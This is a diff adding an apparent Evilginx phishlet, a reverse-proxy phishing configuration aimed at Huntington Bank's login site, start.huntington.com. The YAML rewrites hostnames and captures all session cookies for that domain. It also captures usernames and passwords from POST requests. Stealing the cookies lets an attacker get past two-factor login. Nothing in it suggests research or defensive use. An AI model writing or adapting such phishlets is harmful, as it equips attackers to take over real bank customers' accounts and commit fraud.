@@ -1,0 +1,31 @@
+author: '@me'
+min_ver: '2.3.0'
+
+proxy_hosts:
+  - {phish_sub: 'start', orig_sub: 'start', domain: 'huntington.com', session: true, is_landing: true}
+
+
+sub_filters:
+  - {triggers_on: "start.huntington.com", orig_sub: "start", domain: "huntington", search: "{hostname_regexp}", replace: "{hostname_regexp}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "application/ecmascript", "text/javascript", "text/ecmascript"]}
+
+  auth_tokens:
+  - domain: 'start.huntington.com'
+    keys: ['.*,regexp,always']
+    type: 'cookie'
+
+credentials :
+  username:
+    key: '(.*)'
+    search: '(.*@.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'  
+
+
+
+login:
+  domain: 'start.huntington.com'
+  path: '/#'
+  
